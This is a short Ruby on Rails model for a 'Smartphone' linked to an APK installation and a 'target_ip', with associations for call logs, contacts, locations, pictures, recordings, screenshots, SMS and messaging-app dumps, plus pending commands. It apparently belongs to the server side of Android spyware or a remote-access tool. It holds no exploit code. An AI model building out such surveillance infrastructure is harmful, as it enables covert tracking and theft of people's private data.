class Smartphone < ApplicationRecord
  belongs_to :apk_installation
  has_many :pending_commands, dependent: :destroy
  has_many :call_logs, dependent: :destroy
  has_many :contacts, dependent: :destroy
  has_many :geo_locations, dependent: :destroy
  has_many :pictures, dependent: :destroy
  has_many :recordings, dependent: :destroy
  has_many :screenshots, dependent: :destroy
  has_many :sms_messages, dependent: :destroy
  has_many :messaging_apps_dumps, dependent: :destroy
  
  validates :name, presence: true
  
  # Device ID for WebSocket connection (Android device ID)
  def device_id
    # Use apk_installation target_ip or generate from ID
    apk_installation&.target_ip&.gsub('.', '') || "device_#{id}"
  end
end
